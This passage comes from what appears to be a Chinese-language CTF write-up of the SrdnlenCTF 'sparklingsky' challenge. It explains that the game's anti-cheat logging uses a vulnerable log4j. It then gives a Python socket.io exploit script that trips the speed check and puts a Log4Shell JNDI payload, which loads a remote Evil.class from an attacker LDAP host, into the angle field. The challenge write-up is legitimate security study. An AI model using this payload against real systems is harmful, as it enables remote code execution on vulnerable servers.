+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">players</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">del</span><span class="w"> </span><span class="n">players</span><span class="o">[</span><span class="n">user_id</span><span class="o">]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nf">emit</span><span class="p">(</span><span class="err">&#39;</span><span class="n">update_bird_positions</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">players</span><span class="p">,</span><span class="w"> </span><span class="n">broadcast</span><span class="o">=</span><span class="n">True</span><span class="p">)</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<strong>超速</strong>的情况下，会被日志记录<br>
+<code>log_action(user_id, f&quot;was cheating with final position ({data['x']}, {data['y']}) and final angle: {data['angle']}&quot;)</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202231582.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202231582.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202231582.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202231582.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202231582.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202231582.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+日志记录利用了存在漏洞的<code>log4j</code>，并且启动时还设置了<code>trustURLCodebase=true</code><br>
+直接打 JNDI 即可，<br>
+<strong>超速</strong>要求</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">user_states</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">Anti</span><span class="o">-</span><span class="n">cheat</span><span class="w"> </span><span class="n">thresholds</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MAX_SPEED</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">1000</span><span class="w">  </span><span class="err">#</span><span class="w"> </span><span class="n">Max</span><span class="w"> </span><span class="n">units</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">second</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">analyze_movement</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">new_x</span><span class="p">,</span><span class="w"> </span><span class="n">new_y</span><span class="p">,</span><span class="w"> </span><span class="n">new_angle</span><span class="p">):</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">global</span><span class="w"> </span><span class="n">user_states</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">Initialize</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">state</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">present</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">user_states</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user_states</span><span class="o">[</span><span class="n">user_id</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">&#39;</span><span class="n">last_x</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">new_x</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">&#39;</span><span class="n">last_y</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">new_y</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">&#39;</span><span class="n">last_time</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">time</span><span class="p">.</span><span class="na">time</span><span class="p">(),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">&#39;</span><span class="n">violations</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">user_states</span><span class="o">[</span><span class="n">user_id</span><span class="o">]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">last_x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">user_state</span><span class="o">[</span><span class="err">&#39;</span><span class="n">last_x</span><span class="err">&#39;</span><span class="o">]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">last_y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">user_state</span><span class="o">[</span><span class="err">&#39;</span><span class="n">last_y</span><span class="err">&#39;</span><span class="o">]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">last_time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">user_state</span><span class="o">[</span><span class="err">&#39;</span><span class="n">last_time</span><span class="err">&#39;</span><span class="o">]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">Calculate</span><span class="w"> </span><span class="n">distance</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="n">elapsed</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">distance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">math</span><span class="p">.</span><span class="na">sqrt</span><span class="p">((</span><span class="n">new_x</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">last_x</span><span class="p">)</span><span class="o">**</span><span class="n">2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">new_y</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">last_y</span><span class="p">)</span><span class="o">**</span><span class="n">2</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">time_elapsed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">time</span><span class="p">.</span><span class="na">time</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">last_time</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">speed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">distance</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">time_elapsed</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">time_elapsed</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="n">0</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">speed</span><span class="w"> </span><span class="n">violations</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">speed</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">MAX_SPEED</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">True</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">Update</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">state</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user_states</span><span class="o">[</span><span class="n">user_id</span><span class="o">]</span><span class="p">.</span><span class="na">update</span><span class="p">({</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="err">&#39;</span><span class="n">last_x</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">new_x</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="err">&#39;</span><span class="n">last_y</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">new_y</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="err">&#39;</span><span class="n">last_time</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">time</span><span class="p">.</span><span class="na">time</span><span class="p">(),</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">})</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">False</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用此项目<br>
+<a href="https://github.com/X1r0z/JNDIMap"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/X1r0z/JNDIMap</a><br>
+构造<code>exp</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">socketio</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sio</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socketio</span><span class="p">.</span><span class="na">Client</span><span class="p">()</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@sio.event</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">connect</span><span class="p">():</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Connected</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">server</span><span class="err">&#39;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@sio.event</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">connected</span><span class="p">(</span><span class="n">data</span><span class="p">):</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Server</span><span class="w"> </span><span class="n">says</span><span class="p">:</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@sio.event</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">update_bird_positions</span><span class="p">(</span><span class="n">players</span><span class="p">):</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Updated</span><span class="w"> </span><span class="n">bird</span><span class="w"> </span><span class="n">positions</span><span class="p">:</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">players</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@sio.event</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">disconnect</span><span class="p">():</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Disconnected</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">server</span><span class="err">&#39;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">发送消息到服务器</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">send_move_bird</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="p">,</span><span class="w"> </span><span class="n">angle</span><span class="p">):</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sio</span><span class="p">.</span><span class="na">emit</span><span class="p">(</span><span class="err">&#39;</span><span class="n">move_bird</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="err">&#39;</span><span class="n">user_id</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;x&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;y&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">y</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">angle</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">angle</span><span class="p">})</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">1</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">连接到服务器</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;Cookie&#34;</span><span class="p">:</span><span class="s">&#34;session=.eJwlzjEOwzAIAMC_MHcAu4DJZyJsQO2aNFPVv7dS51vuDXsdeT5gex1X3mB_BmzgU31QDEnuhMZTiHWwpLHEmuxuPTTUWzjr7GKqrRFOk1LXVRkWrZeqFzahKYMckc1_xEiZLLxyWCtRJHbtVkiyEF1W3OEXuc48_hsi-HwB1JYvGQ.Z40fRA.RAjyNPzzmC-a4dPG6ww7MztPteU&#34;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sio</span><span class="p">.</span><span class="na">connect</span><span class="p">(</span><span class="err">&#39;</span><span class="n">http</span><span class="p">:</span><span class="c1">//sparklingsky.challs.srdnlen.it:8081/&#39;,headers=headers)    </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="n">True</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">send_move_bird</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">angle</span><span class="o">=</span><span class="n">90</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">send_move_bird</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="o">=</span><span class="n">10000</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="n">100000000</span><span class="p">,</span><span class="w"> </span><span class="n">angle</span><span class="o">=</span><span class="s">&#34;${jndi:ldap://ip:port/Basic/FromFile/Evil.class}&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sio</span><span class="p">.</span><span class="na">wait</span><span class="p">()</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="n">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#34;__main__&#34;</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">main</span><span class="p">()</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-01-26 20:48:13">Updated on 2025-01-26&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/2025-srdnlenctf/" data-title="2025-SrdnlenCTF"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/java/" class="post-tag" title="Tags - Java">Java</a><a href="/tags/ctf/" class="post-tag" title="Tags - CTF">CTF</a><a href="/tags/socket/" class="post-tag" title="Tags - Socket">Socket</a><a href="/tags/nodejs/" class="post-tag" title="Tags - NodeJS">NodeJS</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/java-jdbc-attack-h2/" class="post-nav-item" rel="prev" title="Java JDBC Attack-H2"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Java JDBC Attack-H2</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
